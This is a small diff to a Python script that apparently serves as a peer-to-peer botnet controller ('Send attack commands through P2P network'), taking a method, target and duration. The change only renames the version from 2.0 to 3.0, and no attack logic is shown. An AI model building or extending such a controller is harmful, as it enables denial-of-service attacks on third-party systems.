@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-AXIS 2.0 P2P Network Controller
+AXIS 3.0 P2P Network Controller
 Send attack commands through P2P network
 """
 
@@ -60,7 +60,7 @@ def send_command(packet, seed_host, seed_port):
 
 def main():
     if len(sys.argv) < 4:
-        print("AXIS 2.0 P2P Controller")
+        print("AXIS 3.0 P2P Controller")
         print("========================")
         print(f"Usage: {sys.argv[0]} <method> <target> <duration>")
         print("")
